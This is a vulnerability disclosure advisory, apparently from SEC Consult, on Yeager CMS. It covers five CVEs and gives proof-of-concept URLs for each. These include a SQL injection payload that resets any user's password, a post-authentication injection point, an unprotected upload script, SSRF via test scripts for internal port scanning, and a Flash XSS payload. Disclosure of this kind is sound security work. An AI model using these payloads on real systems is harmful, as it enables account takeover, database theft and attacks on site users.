Vendor description:
-------------------
Yeager is an open source CMS that aims to become the most cost/time-effective
solution for medium and large web sites and applications.


Business recommendation:
------------------------
Yeager CMS suffers from multiple vulnerabilities due to improper input
validation and unprotected test scripts. By exploiting these vulnerabilities
an attacker could:
    1. Change user's passwords including the administrator's account.
    2. Gain full access to the Yeager CMS database.
    3. Determine internal servers that inaccessible from the Internet.
    4. Attack other users of the Yeager CMS with Cross-Site Scripting.

SEC Consult recommends not to use this software until a thorough security
review has been performed by security professionals and all identified
issues have been resolved.

Vulnerability overview/description:
-----------------------------------
1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
2. Post-authentication Blind SQL Injection (CVE-2015-7569)
3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
5. Non-permanent Cross-site Scripting (CVE-2015-7572)


Proof of concept:
-----------------
1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
http://<host>/yeager/?action=passwordreset&token=<SQL Injection>
http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"<SQL
Injection>"}}]

The vulnerability can also be used for unauthorized reset password of any user.
In order to reset a specific user's password, an attacker will need to provide
a valid email address of the user that he wants to attack.
The email can be retrieved by either social engineering or using the
aforementioned unauthenticated SQL injection vulnerability.

http://<host>/yeager/y.php/responder?handler=recoverLogin&us=sess_20000&lh=70&d
ata=["noevent",{"yg_property":"recoverLogin","params":{"userEmail":"<victim@ema
il.com>","winID":"1"}}]

The above URL just simply creates and sends a reset password token to the
user's email. Next, even if attacker does not know the token,
manipulating SQL commands allows to force to set the new password instantly.

Note that new password MUST be at least 8 characters in length
and must contain both letters and numbers.

http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"'+or+ui
d=(select+id+from+yg_user+where+login='<victim@email.com>')+limit+1--+-","userP
assword":"<new-password>","winID":"1"}}]

2. Post-authentication Blind SQL Injection (CVE-2015-7569)
http://<host>/yeager/y.php/tab_USERLIST
POST Data:
win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000&
lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=<SQL
Injection>&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1

3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
A publicly known Arbitrary File Upload vulnerability of Plupload was found in
Yeager CMS.
Fortunately, to successfully exploit the vulnerability requires PHP directive
"upload_tmp_dir" set to an existing directory and it must contain the writable
directory "plupload".

By default, the PHP directive "upload_tmp_dir" is an empty value.
As a result, the script will attempt to upload a file to /plupload/ instead
which generally does not exist on the filesystem.

http://<host>/yeager/ui/js/3rd/plupload/examples/upload.php

4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite.php
http://<host>/yeager/libs/org/adodb_lite/tests/test_datadictionary.php
http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite_sessions.php

The parameter "dbhost" can be used to perform internal port scan using
time delay measurement. An attacker can provide internal IP address
and port number, for example, 10.10.0.1:22. The attacker then compares
time delays from multiple responses in order to determine host
and port availability.

5. Non-permanent Cross-site Scripting (CVE-2015-7572)
A previously published XSS vulnerability of Plupload was found in Yeager CMS.
http://<host>/yeager/ui/js/3rd/plupload/js/plupload.flash.swf?id=\%22%29%29;}ca
tch%28e%29{alert%28/XSS/%29;}//
